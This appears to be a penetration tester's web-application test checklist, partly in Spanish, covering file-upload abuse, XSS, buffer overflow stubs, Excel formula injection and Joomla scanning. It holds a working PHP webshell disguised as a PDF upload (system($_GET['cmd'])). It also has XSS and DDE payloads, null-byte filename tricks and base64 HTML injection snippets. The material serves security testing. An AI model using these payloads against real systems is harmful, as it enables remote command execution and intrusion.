uZENoaWxkKGVsZW1lbnQpOwogICAgYXBwLmFuaW1hdGUoZWxlbWVudCk7CiAgfSwKCiAgYW5pbWF0ZTogZnVuY3Rpb24gKGVsZW1lbnQpIHsKICAgIHZhciBjaGFyYWN0ZXIgPSBhcHAuY2hhcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogYXBwLmNoYXJzLmxlbmd0aCldOwogICAgdmFyIGR1cmF0aW9uID0gTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogMTUpICsgMTsKICAgIHZhciBvZmZzZXQgPSBNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAoNTAgLSBkdXJhdGlvbiAqIDIpKSArIDM7CiAgICB2YXIgc2l6ZSA9IDEwICsgKDE1IC0gZHVyYXRpb24pOwogICAgZWxlbWVudC5zdHlsZS5jc3NUZXh0ID0gJ3JpZ2h0Oicrb2Zmc2V0Kyd2dzsgZm9udC1zaXplOicrc2l6ZSsncHg7YW5pbWF0aW9uLWR1cmF0aW9uOicrZHVyYXRpb24rJ3MnOwogICAgZWxlbWVudC5pbm5lckhUTUwgPSBjaGFyYWN0ZXI7CiAgICB3aW5kb3cuc2V0VGltZW91dChhcHAucmVtb3ZlLCBkdXJhdGlvbiAqIDEwMDAsIGVsZW1lbnQpOwogIH0sCgogIHJlbW92ZTogZnVuY3Rpb24gKGVsZW1lbnQpIHsKICAgIGVsZW1lbnQucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChlbGVtZW50KTsKICB9LAoKfTsKCmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBhcHAuaW5pdCk7CiAgICA8L3NjcmlwdD4KCgo8L2JvZHk+Cgo8L2h0bWw+"
```

```
function b64_to_utf8(str) {
  return decodeURIComponent(escape(window.atob(str)));
}

var code = b64_to_utf8(b64code);
```

Current document overwrite:

```
document.write( code );
```

New tab blob:
```
var blob = new Blob([code], {type: "text/html"});
var url = window.URL.createObjectURL(blob);
window.open(url);
```

New tab iframe:
```
let newWindow = window.open("")
newWindow.document.write(
    "<iframe width='100%' height='100%' src='data:text/html;base64, " + encodeURI(b64code) + "'></iframe>"
);
```



## Buffer overflow

### Heap Overflows Test (OWASP-BO-002)

Ensure that the application is not susceptible to any heap overflows. 

### Stack Overflows Test (OWASP-BO-003)

Ensure that the application is not susceptible to any stack overflows. 
  
### Format Strings Test (OWASP-BO-004)

Ensure that the application is not susceptible to any format string 

## Feature : File upload - Test Upload of Malicious Files (OTG-BUSLOGIC-009)

### Summary

Many applicationâs business processes allow for the upload of data/information. We regularly check the validity and security of text but accepting files can introduce even more risk. To reduce the risk we may only accept certain file extensions, but attackers are able to encapsulate malicious code into inert file types. Testing for malicious files verifies that the application/system is able to correctly protect against attackers uploading malicious files

### Example 

Suppose a picture sharing application allows users to upload their .gif or .jpg graphic files to the web site. What if an attacker is able to upload a PHP shell, or exe file, or virus? The attacker may then upload the file that may be saved on the system and the virus may spread itself or through remote processes exes or shell code can be executed.

### Test

**Generic Testing Method**

- Review the project documentation and use exploratory testing looking at the application/system to identify what constitutes and âmaliciousâ file in your environment.
- Develop or acquire a known âmaliciousâ file.
- Try to upload the malicious file to the application/system and verify that it is correctly rejected.
- If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated.

**Specific Testing Method 1**

-  Using the Metasploit payload generation functionality generates a shellcode as a Windows executable using the Metasploit âmsfpayloadâ command.
-  Submit the executable via the applicationâs upload functionality and see if it is accepted or properly rejected.

**Specific Testing Method 2**

- Develop or create a file that should fail the application malware detection process. There are many available on the Internet such as ducklin.htm or ducklin-html.htm.
- Submit the executable via the applicationâs upload functionality and see if it is accepted or properly rejected.

**Specific Testing Method 3**

- Set up the intercepting proxy to capture the âvalidâ request for an accepted file.
- Send an âinvalidâ request through with a valid/acceptable file extension and see if the request is accepted or properly rejected.

Example of Content Type for request:

```
Content-Disposition: form-data; name="file"; filename="documento.php"
Content-Type: application/pdf

text/x-php
```

Example of Webshell content:

```
Content-Disposition: form-data; name="file"; filename="smtW3sGGkAyx0YHhV689GsTHkqMaKeIdGXycIgHX1.pdf.pdf.html"
Content-Type: application/pdf

%PDF-1.4
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<p>This is an example of webshell to execute commands in remote server:</p>
<pre>
<?php
   if(isset($_GET['cmd']))
   {
       system($_GET['cmd']);
   
?>
<script>javacript:alert('XSS PAYLOAD')</script>
</pre>
</body>
</html>
%%EOF
```
Other example of webshell:

```
Content-Disposition: form-data; name="file"; filename="smtW3sGGkAyx0YHhV689GsTHkqMaKeIdGXycIgHX1.pdf.pdf.exe"
Content-Type: application/pdf

%PDF-1.4
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<p>This is an example of webshell to execute commands in remote server:</p>
<pre>
<?php
   if(isset($_GET['cmd']))
   {
       system($_GET['cmd']);
   
?>
<script>javacript:alert('XSS PAYLOAD')</script>
</pre>
</body>
%%EOF
```

Test input.

```
<script>javascript:alert("Hacked pronto seras redireccionado...")</script>

href 
javascript:alert("Hacked pronto seras redireccionado, ten buen dÃ­a...")

```

MimeTypes to render.

```

Content-Type: application/x-php

text/x-php
text/html
text/plain
text/x-php
application/x-php
application/x-httpd-php
application/x-httpd-php-source

```


Other useful extensions:

- PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
- ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
- JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action Coldfusion: .cfm, .cfml, .cfc, .dbm
- Flash: .swf
- Perl: .pl, .cgi

 
File extensiones to check:
- nombre_archivo.php%0d%0a.pdf
- nombre_archivo.php%0d%0a.xslx
- nombre_archivo.html%0d%0a.pdf
- shell.php%00.pdf
- shell.php\x00.pdf
- archivo.html\x00.pdf
- archivo.php%00.xlsx
- archivo.php\x00.xlsx


### Tools

- Metasploitâs payload generation functionality
- Intercepting proxy
- Download Dummy PDF https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf
- Dummy PNG file from browser https://png.pngitem.com/pimgs/s/185-1850003_sample-png-transparent-png.png
- Web Shells Repository https://github.com/TheBinitGhimire/Web-Shells



### References
**Whitepapers:**
- Saumil Shah: âAn Introduction to HTTP fingerprintingâ - http://www.net-square.com/httprint_paper.html
- Anant Shrivastava: âWeb Application Finger Printingâ - http:// anantshri.info/articles/web_app_finger_printing.html

**Related websites:**
- OWASP - Unrestricted File Upload - https://www.owasp.org/index.php/Unrestricted_File_Upload
- Why File Upload Forms are a Major Security Threat - http:/www.acunetix.com/websitesecurity/upload-forms-threat/
- File upload security best practices: Block a malicious file upload http://www.computerweekly.com/answer/File-uploadsecurity-best-practices-Block-a-malicious-file-upload
- Overview of Malicious File Upload Attacks http:/securitymecca.com/article/overview-of-malicious-fileupload-attacks/
- Stop people uploading malicious PHP files via forms http://stackoverflow.com/questions/602539/stop-peopleuploading-malicious-php-files-via-forms
- How to Tell if a File is Malicious http://www.techsupportalert.com/content/how-tell-if-filemalicious.htm
- CWE-434: Unrestricted Upload of File with Dangerous Type http://cwe.mitre.org/data/definitions/434.html
- Implementing Secure File Upload http://infosecauditor.wordpress.com/tag/malicious-fileupload/
- Watchful File Upload http://palizine.plynt.com/issues/2011Apr/file-upload/
- Matasploit Generating Payloads http://www.offensive-security.com/metasploit-unleashed/
Generating_Payloads
- Project Shellcode â Shellcode Tutorial 9: Generating Shellcode Using Metasploit http://www.projectshellcode.
com/?q=node/29
- Anti-Malware Test file - http://www.eicar.org/86-0-Intended use.html

### Remediation

While safeguards such as black or white listing of file extensions, using âContent-Typeâ from the header, or using a file type recognizer may not always be protections against this type of vulnerability. Every application that accepts files from users must have a mechanism to verify that the uploaded file does not contain malicious code. Uploaded files should never be stored where the users or attackers can directly access them

## Feature : File upload - Webshell image with injected code

xss2png


## Feature: Excel reporte generation

```
=cmd|'/C calc'!A0
```

## Feature: Email send

Check iteration limit protection for email bombing.

## Feature: Create user

Check iteration limit protection for email bombing.

## Feature: Modify user

Privilege escalation.

## Specific technology: Uso de Joomla

Analysis with joomscan.
```
git clone https://github.com/rezasp/joomscan.git
cd joomscan
perl joomscan.pl
```

## Glossary

DescripciÃ³n de la evidencia:

Como se puede observar en la imagen de evidencia, es posible que el aplicativo este aceptando la carga de archivos relacionados a Webshells de Apache. Se ha reconocido el uso de la tecnologÃ­a Apache, por lo que se recomienda revisar mÃ¡s a detalle este posible riesgo.
